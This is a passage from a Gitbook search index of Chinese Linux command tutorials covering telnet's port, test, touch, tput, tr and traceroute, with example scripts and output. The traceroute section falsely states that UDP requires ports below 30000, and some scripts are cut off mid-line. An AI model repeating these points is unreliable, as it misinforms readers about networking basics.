如果前面有#字符，就去掉它。telnet的默认端口是23，这个端口也是黑客端口扫描的主要对象，因此最好将这个端口修改掉，修改的方法很简单，就是将23这个数字修改掉，改成大一点的数字，比如61123。注意，1024以下的端口号是internet保留的端口号，因此最好不要用，还应该注意不要与其它服务的端口冲突。 参考： 每天一个linux命令（58）：telnet命令 telnet 命令 Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-06-23 17:16:20 "},"Linux-Command/Linux_Command_test.html":{"url":"Linux-Command/Linux_Command_test.html","title":"Linux Command Test","keywords":"","body":"Linux Command test1. 简介2. 数值比较3. 字符串判断4.文件判断5. 条件连接Linux Command test tagsstart shell tagsstop 图 1.2.81.1：在这里插入图片描述 1. 简介 Shell中的 test 命令用于检查某个条件是否成立，它可以进行数值、字符和文件三个方面的测试。 2. 数值比较 -eq 等于则为真 -ne 不等于则为真 -gt 大于则为真 -ge 大于等于则为真 -lt 小于则为真 -le 小于等于则为真 num1=100 num2=100 if test $[num1] -eq $[num2] then echo '两个数相等！' else echo '两个数不相等！' fi 输出结果：bash test1.sh 两个数相等！ #!/bin/bash a=5 b=6 result=$[a+b] # 注意等号两边不能有空格 echo \"result 为： $result\" 结果为: result 为： 11 3. 字符串判断 参数 说明 = 等于则为真 != 不相等则为真 -z 字符串 字符串的长度为零则为真 -n 字符串 字符串的长度不为零则为真 实例 num1=\"ru1noob\" num2=\"runoob\" if test $num1 = $num2 then echo '两个字符串相等!' else echo '两个字符串不相等!' fi 输出结果： 两个字符串不相等! 4.文件判断 参数 说明 -e 文件名 如果文件存在则为真 -r 文件名 如果文件存在且可读则为真 -w 文件名 如果文件存在且可写则为真 -x 文件名 如果文件存在且可执行则为真 -s 文件名 如果文件存在且至少有一个字符则为真 -d 文件名 如果文件存在且为目录则为真 -f 文件名 如果文件存在且为普通文件则为真 -c 文件名 如果文件存在且为字符型特殊文件则为真 -b 文件名 如果文件存在且为块特殊文件则为真 实例： cd /bin if test -e ./bash then echo '文件已存在!' else echo '文件不存在!' fi 输出结果： 文件已存在! 5. 条件连接 另外，Shell 还提供了与( -a )、或( -o )、非( ! )三个逻辑操作符用于将测试条件连接起来，其优先级为： ! 最高， -a 次之， -o 最低。例如： 实例 cd /bin if test -e ./notFile -o -e ./bash then echo '至少有一个文件存在!' else echo '两个文件都不存在' fi Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-06-14 05:30:52 "},"Linux-Command/Linux_Command_touch.html":{"url":"Linux-Command/Linux_Command_touch.html","title":"Linux Command Touch","keywords":"","body":"Linux Command touch 创建文件1. 简介2. 格式3. 参数4. 举例Linux Command touch 创建文件 tagsstart 文件管理 tagsstop 1. 简介 Linux中 touch 命令可以改变文档或目录时间， 包括存取时间或更改时间， 也可以用于创建新文件。 2. 格式 命令格式： touch [选项] [参数] 3. 参数 -a 只更改文件的读取时间。 -m 只更改文件的修改时间。 -c 如指定的文件不存在，不会建立新的文件。 -d 更改指定日期时间，而不是当前系统时间，可设定多种格式。 -r 把指定的文档或目录的时间设置成与参考文档或目录的日期时间一致。 -t 使用指定的时间，而不是当前系统时间，可设置多种格式。 --help 显示帮助 --version 显示版本信息 touch 命令以 [[CC]YY]MMDDhhmm[.ss] 的格式指定新时间戳的日期和时间，相关信息如下。 CC 指定年份的前两位数字。 YY 指定年份的后两位数字。 MM 指定一年的哪一月， 1-12。 DD 指定一年的哪一天， 1-31。 hh 指定一天中的哪一个小时， 0-23。 mm 指定一小时的哪一分钟， 0-59。 Linux文件有三个修改时间。 Access 表示文件访问时间， 当文件被读取时会更新这个时间，但使用 more less tail ls 等命令查看时访问时间不会改变。 Modify 表示文件修改时间，这里指的是文件内容的修改。 Change 表示文件属性改变时间。比如通过 chmod 命令更改文件属性时会更新文件时间。 参数： 指定要设置时间属性的文件列表或要创建的目录。 4. 举例 #如果abc.txt不存在则创建文件 abc.txt ，如果abc.txt存在，则使用当前时间更改文件时间（三个都改）。 touch abc.txt #　将文件日期更改为参考文件日期。 touch -r test2　 #将文件修改日期调整为两天前 touch -d \"2 days ago\" test2 #将文件修改日期调整为指定日期，1 月 23 日 12 点 15 分。 touch -t \"01231215\" test2 　 创建特定日期的文件 touch -d 20190202 file Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-06-14 05:34:45 "},"Linux-Command/Linux_Command_tput.html":{"url":"Linux-Command/Linux_Command_tput.html","title":"Linux Command Tput","keywords":"","body":"Linux Command tput 终端操作1. 简介2. 什么是 terminfo 数据库3. 参数4. 属性4.1 光标属性4.2 移动光标4.3 移动光标并显示信息4.4 更改光标的属性4/5 文本属性5. 实例5.1 变量格式5.2 使字符串有颜色，底色，加粗5.3 格式传参输出5.4 光标定位输出5.5 输出艺术字体5.6 时钟倒计时Linux Command tput 终端操作 tagsstart 编辑器 tagsstop 1. 简介 tput 命令将通过 terminfo 数据库对您的终端会话进行初始化和操作。通过使用 tput，您可以更改几项终端功能，如移动或更改光标、更改文本属性，以及清除终端屏幕的特定区域。 与 UNIX 中的大多数命令一样，tput 命令既可以用在 shell 命令行中也可以用在 shell 脚本中。为让您更好地理解 tput，本文首先从命令行讲起，然后紧接着讲述 shell 脚本示例。 2. 什么是 terminfo 数据库 UNIX 系统上的 terminfo 数据库用于定义终端和打印机的属性及功能，包括各设备（例如，终端和打印机）的行数和列数以及要发送至该设备的文本的属性。UNIX 中的几个常用程序都依赖 terminfo 数据库提供这些属性以及许多其他内容，其中包括 vi 和 emacs 编辑器以及 curses 和 man 程序。 与 UNIX 中的大多数命令一样，tput 命令既可以用在 shell 命令行中也可以用在 shell 脚本中。为让您更好地理解 tput，本文首先从命令行讲起，然后紧接着讲述 shell 脚本示例。 3. 参数 (1)字符串输出参数设置 　　bel 警铃 　　blink 闪烁模式 　　bold 粗体 　　civis 隐藏光标 　　clear 清屏 　　cnorm 不隐藏光标 　　cup 移动光标到屏幕位置（x，y） 　　el 清除到行尾 　　ell 清除到行首 　　smso 启动突出模式 　　rmso 停止突出模式 　　smul 开始下划线模式 　　rmul 结束下划线模式 　　sc 保存当前光标位置 　　rc 恢复光标到最后保存位置 　　sgr0 正常屏幕 　　rev 逆转视图 (2)数字输出参数设置 　　cols 列数目 　　ittab 设置宽度 　　lines 屏幕行数 (3)布尔输出参数设置 　　chts 光标不可见 　　hs 具有状态行 （4）景色 setaf ColorNumber## 设置前景色 setab ColorNumber ##设置背景色 4. 属性 4.1 光标属性 在 UNIX shell 脚本中或在命令行中，移动光标或更改光标属性可能是非常有用的。有些情况下，您可能需要输入敏感信息（如密码），或在屏幕上两个不同的区域输入信息。在此类情况下，使用 tput 可能会对您有所帮助。 tput clear # 清屏 tput sc # 保存当前光标位置 tput cup 10 13 # 将光标移动到 x y tput civis # 光标不可见 tput cnorm # 光标可见 tput rc # 显示输出，返回光标位置 exit 0 4.2 移动光标 使用 tput 可以方便地实现在各设备上移动光标的位置。通过在 tput 中使用 cup 选项，或光标位置，您可以在设备的各行和各列中将光标移动到任意 X 或 Y 坐标。设备左上角的坐标为 (0,0)。 要在设备上将光标移动到第 5 列 (X) 的第 1 行 (Y)，只需执行 tput cup 5 1。另一个示例是 tput cup 23 45，此命令将使光标移动到第 23 列上的第 45 行。 4.3 移动光标并显示信息 另一种有用的光标定位技巧是移动光标，执行用于显示信息的命令，然后返回到前一光标位置： (tput sc ; tput cup 23 45 ; echo “Input from tput/echo at 23/45” ; tput rc) 下面我们分析一下 subshell 命令： tput sc 必须首先保存当前的光标位置。要保存当前的光标位置，请包括 sc 选项或“save cursor position”。 tput cup 23 45 在保存了光标位置后，光标坐标将移动到 (23,45)。 echo “Input from tput/echo at 23/45” 将信息显示到 stdout 中。 tput rc 在显示了这些信息之后，光标必须返回到使用 tput sc 保存的原始位置。要使光标返回到其上次保存的位置，请包括 rc 选项或“restore cursor position”。 注意：由于本文首先详细介绍了通过命令行执行 tput，因此您可能会觉得在自己的 subshell中执行命令要比单独执行每条命令然后在每条命令执行之前显示提示更简洁。 4.4 更改光标的属性 在向某一设备显示数据时，很多时候您并不希望看到光标。将光标转换为不可见可以使数据滚动时的屏幕看起来更整洁。要使光标不可见，请使用 civis 选项（例如，tput civis）。在数据完全显示之后，您可以使用 tput cnorm 选项将光标再次转变为可见。 4/5 文本属性 更改文本的显示方式可以让用户注意到菜单中的一组词或警惕用户注意某些重要的内容。您可以通过以下方式更改文本属性：使文本加粗、在文本下方添加下划线、更改背景颜色和前景颜色，以及逆转颜色方案等。 要更改文本的颜色，请使用 setb 选项（用于设置背景颜色）和 setf 选项（用于设置前景颜色）以及在 terminfo 数据库中分配的颜色数值。通常情况下，分配的数值与颜色的对应关系如下，但是可能会因 UNIX 系统的不同而异： 0：黑色 1：蓝色 2：绿色 3：青色 4：红色 5：洋红色 6：黄色 7：白色 执行以下示例命令可以将背景颜色更改为黄色，将前景颜色更改为红色： tput setb 6 tput setf 4 图 1.2.83.1：在这里插入图片描述 有时，仅为文本着色还不够，也就是说，您想要通过另一种方式引起用户的注意。可以通过两种方式达到这一目的：一是将文本设置为粗体，二是为文本添加下划线。 要将文本更改为粗体，请使用 bold 选项。要开始添加下划线，请使用 smul 选项。在完成显示带下划线的文本后，请使用 rmul 选项。 5. 实例 5.1 变量格式 #加粗 bold=$(tput bold) #下划线 underline=$(tput sgr 0 1) #重置规则 reset=$(tput sgr0) #红色 red=$(tput setaf 1) #绿色 green=$(tput setaf 2) 5.2 使字符串有颜色，底色，加粗 #!/bin/bash printf $(tput setaf 2; tput bold)'color show\\n\\n'$(tput sgr0) for((i=0; i 图 1.2.83.2：在这里插入图片描述 5.3 格式传参输出 #!/bin/bash # $1 str print string # $2 color 0-7 设置颜色 # $3 bgcolor 0-7 设置背景颜色 # $4 bold 0-1 设置粗体 # $5 underline 0-1 设置下划线 function format_output(){ str=$1 color=$2 bgcolor=$3 bold=$4 underline=$5 normal=$(tput sgr0) case \"$color\" in 0|1|2|3|4|5|6|7) setcolor=$(tput setaf $color;) ;; *) setcolor=\"\" ;; esac case \"$bgcolor\" in 0|1|2|3|4|5|6|7) setbgcolor=$(tput setab $bgcolor;) ;; *) setbgcolor=\"\" ;; esac if [ \"$bold\" = \"1\" ]; then setbold=$(tput bold;) else setbold=\"\" fi if [ \"$underline\" = \"1\" ]; then setunderline=$(tput smul;) else setunderline=\"\" fi printf \"$setcolor$setbgcolor$setbold$setunderline$str$normal\\n\" } format_output \"Yesterday Once more\" 2 5 1 1 exit 0 图 1.2.83.3：在这里插入图片描述 5.4 光标定位输出 #!/bin/bash # clear the screen tput clear # Move cursor to screen location X,Y (top left is 0,0) tput cup 3 15 # set a foreground colour using ANSI escape tput setaf 3 echo \"XYX Corp LTD.\" tput sgr0 tput cup 5 17 # Set reverse video mode tput rev echo \"M A I N - M E N U\" tput sgr0 tput cup 7 15 echo \"1\\. User Management\" tput cup 8 15 echo \"2\\. service Management\" tput cup 9 15 echo \"3\\. Process Management\" tput cup 10 15 echo \"4\\. Backup\" # Set bold mode tput bold tput cup 12 15 read -p \"Enter your choice [1-4] \" choice tput clear tput sgr0 tput rc exit 0 图 1.2.83.4：在这里插入图片描述 5.5 输出艺术字体 root@test1:~/shell/tput# apt install figlet root@test1:~/shell/tput# wget http://www.figlet.org/fonts/roman.flf --2021-11-18 15:44:37-- http://www.figlet.org/fonts/roman.flf Resolving www.figlet.org (www.figlet.org)... 188.226.162.120 Connecting to www.figlet.org (www.figlet.org)|188.226.162.120|:80... connected. HTTP request sent, awaiting response... 200 OK Length: 12948 (13K) [text/plain] Saving to: ‘roman.flf’ roman.flf 100%[====================================================================================================================================================>] 12.64K --.-KB/s in 0s 2021-11-18 15:44:38 (70.6 MB/s) - ‘roman.flf’ saved [12948/12948] root@test1:~/shell/tput# echo; tput setaf 1; figlet -c Happy; tput setaf 2; figlet -c Holidays; tput sgr0; _ _ | | | | __ _ _ __ _ __ _ _ | |_| |/ _` | '_ \\| '_ \\| | | | | _ | (_| | |_) | |_) | |_| | |_| |_|\\__,_| .__/| .__/ \\__, | |_| |_| |___/ _ _ _ _ _ | | | | ___ | (_) __| | __ _ _ _ ___ | |_| |/ _ \\| | |/ _` |/ _` | | | / __| | _ | (_) | | | (_| | (_| | |_| \\__ \\ |_| |_|\\___/|_|_|\\__,_|\\__,_|\\__, |___/ |___/ root@test1:~/shell/tput# echo; tput setaf 1; figlet -c -f roman Happy; tput setaf 2; figlet -c -f roman Holidays; tput sgr0; ooooo ooooo `888' `888' 888 888 .oooo. oo.ooooo. oo.ooooo. oooo ooo 888ooooo888 `P )88b 888' `88b 888' `88b `88. .8' 888 888 .oP\"888 888 888 888 888 `88..8' 888 888 d8( 888 888 888 888 888 `888' o888o o888o `Y888\"\"8o 888bod8P' 888bod8P' .8' 888 888 .o..P' o888o o888o `Y8P' ooooo ooooo oooo o8o .o8 `888' `888' `888 `\"' \"888 888 888 .ooooo. 888 oooo .oooo888 .oooo. oooo ooo .oooo.o 888ooooo888 d88' `88b 888 `888 d88' `888 `P )88b `88. .8' d88( \"8 888 888 888 888 888 888 888 888 .oP\"888 `88..8' `\"Y88b. 888 888 888 888 888 888 888 888 d8( 888 `888' o. )88b o888o o888o `Y8bod8P' o888o o888o `Y8bod88P\" `Y888\"\"8o .8' 8\"\"888P' .o..P' `Y8P' 5.6 时钟倒计时 #!/bin/bash # tclock - Display a clock in a terminal BG_BLUE=\"$(tput setab 4)\" FG_BLACK=\"$(tput setaf 0)\" FG_WHITE=\"$(tput setaf 7)\" terminal_size() { # Calculate the size of the terminal terminal_cols=\"$(tput cols)\" terminal_rows=\"$(tput lines)\" } banner_size() { # Because there are different versions of banner, we need to # calculate the size of our banner's output banner_cols=0 banner_rows=0 while read; do [[ ${#REPLY} -gt $banner_cols ]] && banner_cols=${#REPLY} ((++banner_rows)) done 参考： IBM tput Command tput: Portable Terminal Control tput command figlet command Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-06-23 05:12:30 "},"Linux-Command/Linux_Command_tr.html":{"url":"Linux-Command/Linux_Command_tr.html","title":"Linux Command Tr","keywords":"","body":"Linux Command tr 过滤1. 简介2. 语法3. 选项4. 实例Linux Command tr 过滤 tagsstart 文件管理 tagsstop 图 1.2.84.1：在这里插入图片描述 1. 简介 tr命令可以对来自标准输入的字符进行替换、压缩和删除。它可以将一组字符变成另一组字符，经常用来编写优美的单行命令，作用很强大。 2. 语法 tr [选项]... SET1 [SET2] 3. 选项 -c或——complerment：取代所有不属于第一字符集的字符； -d或——delete：删除所有属于第一字符集的字符； -s或--squeeze-repeats：把连续重复的字符以单独一个字符表示； -t或--truncate-set1：先删除第一字符集较第二字符集多出的字符。 SET 是一组字符串，一般都可按照字面含义理解。解析序列如下： \\NNN 八进制值为NNN 的字符(1 至3 个数位) \\\\ 反斜杠 \\a 终端鸣响 \\b 退格 \\f 换页 \\n 换行 \\r 回车 \\t 水平制表符 \\v 垂直制表符 字符1-字符2 从字符1 到字符2 的升序递增过程中经历的所有字符 [字符*] 在SET2 中适用，指定字符会被连续复制直到吻合设置1 的长度 [字符*次数] 对字符执行指定次数的复制，若次数以 0 开头则被视为八进制数 [:alnum:] 所有的字母和数字 [:alpha:] 所有的字母 [:blank:] 所有呈水平排列的空白字符 [:cntrl:] 所有的控制字符 [:digit:] 所有的数字 [:graph:] 所有的可打印字符，不包括空格 [:lower:] 所有的小写字母 [:print:] 所有的可打印字符，包括空格 [:punct:] 所有的标点字符 [:space:] 所有呈水平或垂直排列的空白字符 [:upper:] 所有的大写字母 [:xdigit:] 所有的十六进制数 [=字符=] 所有和指定字符相等的字符 4. 实例 将输入字符由大写转换为小写： echo \"HELLO WORLD\" | tr 'A-Z' 'a-z' hello world 'A-Z' 和 'a-z'都是集合，集合是可以自己制定的，例如：'ABD-}'、'bB.,'、'a-de-h'、'a-c0-9'都属于集合，集合里可以使用'\\n'、'\\t'，可以可以使用其他ASCII字符。 使用tr删除字符： echo \"hello 123 world 456\" | tr -d '0-9' hello world 将制表符转换为空格： cat text | tr '\\t' ' ' 字符集补集，从输入文本中将不在补集中的所有字符删除： echo aa.,a 1 b#$bb 2 c*/cc 3 ddd 4 | tr -d -c '0-9 \\n' 1 2 3 4 此例中，补集中包含了数字0~9、空格和换行符\\n，所以没有被删除，其他字符全部被删除了。 用tr压缩字符，可以压缩输入中重复的字符： echo \"thissss is a text linnnnnnne.\" | tr -s ' sn' this is a text line. 巧妙使用tr做数字相加操作： echo 1 2 3 4 5 6 7 8 9 | xargs -n1 | echo $[ $(tr '\\n' '+') 0 ] 删除Windows文件“造成”的'^M'字符： cat file | tr -s \"\\r\" \"\\n\" > new_file 或 cat file | tr -d \"\\r\" > new_file tr可以使用的字符类： [:alnum:]：字母和数字 [:alpha:]：字母 [:cntrl:]：控制（非打印）字符 [:digit:]：数字 [:graph:]：图形字符 [:lower:]：小写字母 [:print:]：可打印字符 [:punct:]：标点符号 [:space:]：空白字符 [:upper:]：大写字母 [:xdigit:]：十六进制字符 使用方式： tr '[:lower:]' '[:upper:]' 更多阅读： tr command in Unix/Linux with examples Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-06-23 17:15:46 "},"Linux-Command/Linux_Command_traceroute.html":{"url":"Linux-Command/Linux_Command_traceroute.html","title":"Linux Command Traceroute","keywords":"","body":"Linux Command traceroute 路由追踪1. 介绍2. 工作原理：3. 命令格式：4. 命令功能：5. 用法5.1 最常用的用法5.2 跳数设置5.3 显示IP地址，不查主机名5.4 探测包使用的基本UDP端口设置68885.5 把探测包的个数设置为值45.6 把对外发探测包的等待响应时间设置为3秒6. 总结Linux Command traceroute 路由追踪 tagsstart 网络 分析 tagsstop 1. 介绍 Traceroute是Linux和Mac OS等系统默认提供的路由追踪小程序，Tracert是Windows系统默认提供的路由追踪小程序。二者的功能相同，都能探测数据包从源地址到目的地址经过的路由器的IP地址。Traceroute/Tracert的实现都借助了TTL：通过向目的地址发送一系列的探测包，设置探测包的TTL初始值分别为1,2,3…，根据返回的超时通知（ICMP Time Exceeded Message）得到源地址与目的地址之间的每一跳路由信息。虽然两者输出结果一致，但在实现原理上还有着显著的差别。 2. 工作原理： Traceroute程序的设计是利用ICMP及IP header的TTL（Time To Live）栏位（field）。首先，traceroute送出一个TTL是1的IP datagram（其实，每次送出的为3个40字节的包，包括源地址，目的地址和包发出的时间标签）到目的地，当路径上的第一个路由器（router）收到这个datagram时，它将TTL减1。此时，TTL变为0了，所以该路由器会将此datagram丢掉，并送回一个「ICMP time exceeded」消息（包括发IP包的源地址，IP包的所有内容及路由器的IP地址），traceroute 收到这个消息后，便知道这个路由器存在于这个路径上，接着traceroute 再送出另一个TTL是2 的datagram，发现第2 个路由器...... traceroute 每次将送出的datagram的TTL 加1来发现另一个路由器，这个重复的动作一直持续到某个datagram 抵达目的地。当datagram到达目的地后，该主机并不会送回ICMP time exceeded消息，因为它已是目的地了，那么traceroute如何得知目的地到达了呢？ Traceroute在送出UDP datagrams到目的地时，它所选择送达的port number 是一个一般应用程序都不会用的号码（30000 以上），所以当此UDP datagram 到达目的地后该主机会送回一个「ICMP port unreachable」的消息，而当traceroute 收到这个消息时，便知道目的地已经到达了。所以traceroute 在Server端也是没有所谓的Daemon 程式。 Traceroute提取发 ICMP TTL到期消息设备的IP地址并作域名解析。每次 ，Traceroute都打印出一系列数据,包括所经过的路由设备的域名及 IP地址,三个包每次来回所花时间。 原理过程 从源地址发出一个UDP探测包到目的地址，并将TTL设置为1； 到达路由器时，将TTL减1； 当TTL变为0时，包被丢弃，路由器向源地址发回一个ICMP超时通知（ICMP Time Exceeded Message），内含发送IP包的源地址，IP包的所有内容及路由器的IP地址； 当源地址收到该ICMP包时，显示这一跳路由信息； 重复1～5，并每次设置TTL加1； 直至目标地址收到探测数据包，并返回端口不可达通知（ICMP Port Unreachable）； 当源地址收到ICMP Port Unreachable包时停止traceroute。 注意： Linux和Mac OS等系统使用UDP包进行探测，目标端口号默认为33434，每次探测目标端口号加1。Traceroute故意使用了一个大于 30000 的目标端口号，以保证目标地址收到数据包后能够返回一个“端口不可达”的 ICMP 报文，于是源地址就可将端口不可达报文当作跟踪结束的标志。 Traceroute每跳默认发送3个探测包（发包的数量可通过-q进行设置），探测包的返回会受到网络情况的影响。如果防火墙封掉了ICMP的返回信息，那么相应的延时位置会以*显示。如果某台网关阻塞或者某台DNS出现问题，那么相应行的延时会变长。可以加-n 参数来避免DNS解析，以IP格式输出数据。 每个探测包都有唯一的标识号，使得Traceroute能够识别返回的包。UDP数据包使用递增的目标端口号进行标识。 在大多数情况下，我们会在linux主机系统下，直接执行命令行： traceroute hostname 而在Windows系统下是执行tracert的命令： tracert hostname 3. 命令格式： traceroute[参数][主机] 4. 命令功能： traceroute指令让你追踪网络数据包的路由途径，预设数据包大小是40Bytes，用户可另行设置。 具体参数格式： traceroute [-dFlnrvx][-f][-g...][-i][-m][-p][-s][-t][-w][主机名称或IP地址][数据包大小] 命令参数： -d 使用Socket层级的排错功能。 -f 设置第一个检测数据包的存活数值TTL的大小。 -F 设置勿离断位。 -g 设置来源路由网关，最多可设置8个。 -i 使用指定的网络界面送出数据包。 -I 使用ICMP回应取代UDP资料信息。 -m 设置检测数据包的最大存活数值TTL的大小。 -n 直接使用IP地址而非主机名称。 -p 设置UDP传输协议的通信端口。 -r 忽略普通的Routing Table，直接将数据包送到远端主机上。 -s 设置本地主机送出数据包的IP地址。 -t 设置检测数据包的TOS数值。 -v 详细显示指令的执行过程。 -w 设置等待远端主机回报的时间。 -x 开启或关闭数据包的正确性检验。 5. 用法 5.1 最常用的用法 $ traceroute www.baidu.com traceroute to www.baidu.com (182.61.200.7), 30 hops max, 60 byte packets 1 * OrayBox.lan (192.168.1.1) 0.353 ms * 2 10.0.11.254 (10.0.11.254) 0.912 ms 1.433 ms 1.627 ms 3 124.205.26.49 (124.205.26.49) 8.052 ms 8.856 ms 9.718 ms 4 10.255.149.185 (10.255.149.185) 3.078 ms 3.338 ms 2.789 ms 5 10.255.36.45 (10.255.36.45) 2.948 ms 2.138 ms 2.986 ms 6 218.241.253.77 (218.241.253.77) 1.712 ms 1.673 ms 1.402 ms 7 14.197.177.21 (14.197.177.21) 4.934 ms 14.197.177.81 (14.197.177.81) 120.167 ms 14.197.178.49 (14.197.178.49) 1.574 ms 8 14.197.249.126 (14.197.249.126) 2.159 ms 14.197.149.182 (14.197.149.182) 2.117 ms 14.197.249.134 (14.197.249.134) 2.342 ms 9 182.61.252.218 (182.61.252.218) 2.938 ms 182.61.252.212 (182.61.252.212) 2.557 ms 182.61.252.220 (182.61.252.220) 2.749 ms 10 * * * 11 * * * 12 * * * 说明： 记录按序列号从1开始，每个纪录就是一跳 ，每跳表示一个网关，我们看到每行有三个时间，单位是 ms，其实就是-q的默认参数。探测数据包向每个网关发送三个数据包后，网关响应后返回的时间；如果您用 traceroute -q 4 www.58.com ，表示向每个网关发送4个数据包。 如果在局域网中的不同网段之间，我们可以通过traceroute 来排查问题所在，是主机的问题还是网关的问题。如果我们通过远程来访问某台服务器遇到问题时，我们用到traceroute 追踪数据包所经过的网关，提交IDC服务商，也有助于解决问题；但目前看来在国内解决这样的问题是比较困难的，就是我们发现问题所在，IDC服务商也不可能帮助我们解决。 5.2 跳数设置 显示10行 $ traceroute -m 10 www.baidu.com traceroute to www.baidu.com (182.61.200.7), 10 hops max, 60 byte packets 1 * * * 2 10.0.11.254 (10.0.11.254) 1.070 ms 1.224 ms 1.520 ms 3 124.205.26.49 (124.205.26.49) 11.125 ms 10.209 ms 11.849 ms 4 10.255.149.185 (10.255.149.185) 2.950 ms 3.523 ms 3.185 ms 5 10.255.36.45 (10.255.36.45) 41.992 ms 41.845 ms 43.245 ms 6 218.241.253.77 (218.241.253.77) 1.564 ms 1.441 ms 1.369 ms 7 14.197.243.61 (14.197.243.61) 2.921 ms 14.197.243.121 (14.197.243.121) 1.768 ms 14.197.229.169 (14.197.229.169) 1.909 ms 8 14.197.178.106 (14.197.178.106) 11.836 ms 14.197.178.94 (14.197.178.94) 2.711 ms 14.197.249.126 (14.197.249.126) 2.306 ms 9 182.61.252.218 (182.61.252.218) 3.604 ms 182.61.252.220 (182.61.252.220) 3.581 ms 2.858 ms 10 * * * 5.3 显示IP地址，不查主机名 $ traceroute -n www.baidu.com traceroute -n www.baidu.com traceroute to www.baidu.com (182.61.200.6), 30 hops max, 60 byte packets 1 192.168.1.1 0.354 ms * * 2 10.0.11.254 0.967 ms 1.647 ms 1.816 ms 3 124.205.26.49 7.449 ms 9.085 ms 8.119 ms 4 10.255.149.185 3.085 ms 2.802 ms 3.335 ms 5 * * 10.255.36.45 3.151 ms 6 124.205.98.1 1.459 ms 1.615 ms 1.509 ms 7 14.197.178.41 1.749 ms 14.197.179.69 1.627 ms 14.197.177.21 1.639 ms 8 14.197.249.94 2.123 ms 14.197.249.134 2.334 ms 14.197.249.122 1.969 ms 9 182.61.252.212 2.445 ms 2.555 ms 182.61.252.218 4.362 ms 10 * * * 5.4 探测包使用的基本UDP端口设置6888 $ traceroute -p 6888 www.baidu.com traceroute to www.baidu.com (182.61.200.7), 30 hops max, 60 byte packets 1 * * * 2 10.0.11.254 (10.0.11.254) 0.894 ms 1.404 ms 1.583 ms 3 124.205.26.49 (124.205.26.49) 9.939 ms 13.234 ms 10.687 ms 4 10.255.149.185 (10.255.149.185) 2.609 ms 3.058 ms 3.281 ms 5 10.255.36.45 (10.255.36.45) 1.611 ms 4.104 ms 3.851 ms 6 218.241.253.77 (218.241.253.77) 1.464 ms 1.420 ms 1.332 ms 7 14.197.243.125 (14.197.243.125) 1.525 ms 14.197.177.9 (14.197.177.9) 11.018 ms 14.197.177.21 (14.197.177.21) 1.720 ms 8 14.197.250.170 (14.197.250.170) 2.287 ms 14.197.178.94 (14.197.178.94) 2.403 ms 14.197.149.182 (14.197.149.182) 2.402 ms 9 182.61.252.218 (182.61.252.218) 2.567 ms 182.61.252.210 (182.61.252.210) 2.528 ms 182.61.252.218 (182.61.252.218) 2.427 ms 10 * * * 5.5 把探测包的个数设置为值4 $ traceroute -q 4 www.baidu.com traceroute to www.baidu.com (182.61.200.6), 30 hops max, 60 byte packets 1 * * * * 2 10.0.11.254 (10.0.11.254) 1.471 ms 1.779 ms 0.812 ms 1.934 ms 3 124.205.26.49 (124.205.26.49) 15.320 ms 13.738 ms 14.399 ms 16.247 ms 4 10.255.149.185 (10.255.149.185) 3.591 ms 3.831 ms 3.195 ms 4.109 ms 5 10.255.36.45 (10.255.36.45) 3.697 ms * * 2.735 ms 6 124.205.98.1 (124.205.98.1) 2.260 ms 2.087 ms 2.273 ms 2.058 ms 7 14.197.179.73 (14.197.179.73) 1.630 ms 14.197.177.9 (14.197.177.9) 9.499 ms 14.197.177.81 (14.197.177.81) 66.843 ms 14.197.178.45 (14.197.178.45) 3.344 ms 8 14.197.149.178 (14.197.149.178) 3.324 ms 14.197.249.126 (14.197.249.126) 2.112 ms 14.197.149.182 (14.197.149.182) 2.139 ms 14.197.178.98 (14.197.178.98) 2.108 ms 9 182.61.252.220 (182.61.252.220) 2.562 ms 182.61.252.212 (182.61.252.212) 2.430 ms 182.61.252.218 (182.61.252.218) 2.464 ms 2.579 ms 10 * * * * 5.6 把对外发探测包的等待响应时间设置为3秒 $ traceroute -w 3 www.baidu.com traceroute to www.baidu.com (182.61.200.7), 30 hops max, 60 byte packets 1 OrayBox.lan (192.168.1.1) 0.456 ms 0.376 ms * 2 10.0.11.254 (10.0.11.254) 1.532 ms 0.951 ms 1.968 ms 3 124.205.26.49 (124.205.26.49) 71.877 ms 73.608 ms 72.690 ms 4 10.255.149.185 (10.255.149.185) 3.039 ms 2.668 ms 3.273 ms 5 10.255.36.45 (10.255.36.45) 7.212 ms 6.999 ms 7.247 ms 6 218.241.253.77 (218.241.253.77) 1.966 ms 1.840 ms 1.778 ms 7 14.197.178.49 (14.197.178.49) 2.409 ms 14.197.177.5 (14.197.177.5) 1.539 ms 14.197.177.89 (14.197.177.89) 1.724 ms 8 14.197.249.94 (14.197.249.94) 2.540 ms 14.197.178.106 (14.197.178.106) 2.493 ms 14.197.249.122 (14.197.249.122) 1.981 ms 9 182.61.252.210 (182.61.252.210) 7.632 ms 182.61.252.212 (182.61.252.212) 7.551 ms 182.61.252.210 (182.61.252.210) 7.527 ms 10 * * * 6. 总结 深度追踪针对GitHub的DDoS攻击 一些注意点 并不是所有网关都会如实返回ICMP超时报文。出于安全性考虑，大多数防火墙以及启用了防火墙功能的路由器缺省配置为不返回各种ICMP报文，其余路由器或交换机也可能被管理员主动修改配置变为不返回 ICMP报文。因此traceroute程序不一定能拿到所有的沿途网关地址。所以，当某个TTL值的数据包得不到响应时，并不能停止这一追踪过程，程序仍然会把TTL递增而发出下一个数据包。这个过程将一直持续到数据包发送到目标主机，或者达到默认或用参数指定的追踪限制（maximum_hops）才结束追踪。依据上述原理，利用了UDP数据包的traceroute程序在数据包到达真正的目的主机时，就可能因为该主机没有提供UDP服务而简单将数据包抛弃，并不返回任何信息。为了解决这个问题，traceroute故意使用了一个大于30000的端口号，因UDP协议规定端口号必须小于30000，所以目标主机收到数据包后唯一能做的事就是返回一个“端口不可达”的ICMP报文，于是主叫方就将端口不可达报文当作跟踪结束的标志。 使用UDP的traceroute，失败还是比较常见的。这常常是由于，在运营商的路由器上，UDP与ICMP的待遇大不相同。为了利于troubleshooting，ICMP ECHO Request/Reply 